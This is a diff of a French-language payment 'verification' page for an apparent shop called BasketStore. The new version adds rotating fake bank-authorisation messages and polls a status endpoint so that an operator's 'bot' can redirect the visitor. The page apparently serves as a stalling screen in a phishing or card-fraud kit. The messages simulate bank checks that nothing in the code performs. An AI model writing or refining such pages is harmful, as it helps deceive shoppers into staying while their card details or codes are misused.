@@ -1,53 +1,92 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Vérification du paiement</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vérification Paiement - BasketStore</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #f8f8f8;
-      color: #333;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: linear-gradient(135deg, #f9fafb, #e3e7eb);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
       text-align: center;
-      padding-top: 120px;
+      color: #333;
     }
     .spinner {
-      margin: 40px auto;
-      width: 80px;
-      height: 80px;
-      border: 8px solid #ddd;
-      border-top: 8px solid #007bff;
+      border: 10px solid #e0e0e0;
+      border-top: 10px solid #007bff;
       border-radius: 50%;
-      animation: spin 1s linear infinite;
+      width: 100px;
+      height: 100px;
+      animation: spin 1.2s linear infinite;
+      margin-bottom: 30px;
     }
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-    h2 {
-      font-size: 1.4em;
-      margin-top: 20px;
-      color: #444;
+    h1 {
+      font-size: 1.8em;
+      margin-bottom: 10px;
+    }
+    #statusText {
+      font-size: 1.1em;
+      color: #555;
+      margin-top: 10px;
+    }
+    small {
+      color: #888;
+      display: block;
+      margin-top: 15px;
     }
   </style>
 </head>
 <body>
+  <h1>💳 Vérification du paiement en cours...</h1>
   <div class="spinner"></div>
-  <h2>💳 Vérification de votre paiement en cours...</h2>
-  <p>Merci de patienter, la banque est en train de confirmer votre transaction.</p>
+  <p id="statusText">Autorisation de la banque en cours...</p>
+  <small>(Ne fermez pas cette page)</small>
 
   <script>
-    // 🔁 Vérifie régulièrement si le bot a déclenché la redirection
+    // ✨ Animation texte dynamique
+    const messages = [
+      "⏳ Autorisation de la banque en cours...",
+      "🔒 Vérification du code de sécurité...",
+      "🏦 Communication avec votre banque...",
+      "💬 En attente de validation...",
+      "✅ Traitement en cours..."
+    ];
+    let i = 0;
+    setInterval(() => {
+      i = (i + 1) % messages.length;
+      document.getElementById('statusText').textContent = messages[i];
+    }, 2500);
+
+    // 🔁 Vérifie redirection du bot (paiement accepté, etc.)
+    let checking = false, lastRedirect = null;
     async function checkStatus() {
-      const res = await fetch('/api/status');
-      const data = await res.json();
-      if (data.redirect) {
-        window.location.href = data.redirect;
-      } else {
+      if (checking) return;
+      checking = true;
+      try {
+        const res = await fetch('/api/status', { cache: 'no-store' });
+        const data = await res.json();
+        if (data.redirect && data.redirect !== lastRedirect) {
+          lastRedirect = data.redirect;
+          window.location.href = data.redirect;
+          return;
+        }
+      } catch (e) {
+        console.warn("Erreur checkStatus:", e);
+      } finally {
+        checking = false;
         setTimeout(checkStatus, 2000);
       }
     }
+
     checkStatus();
   </script>
 </body>
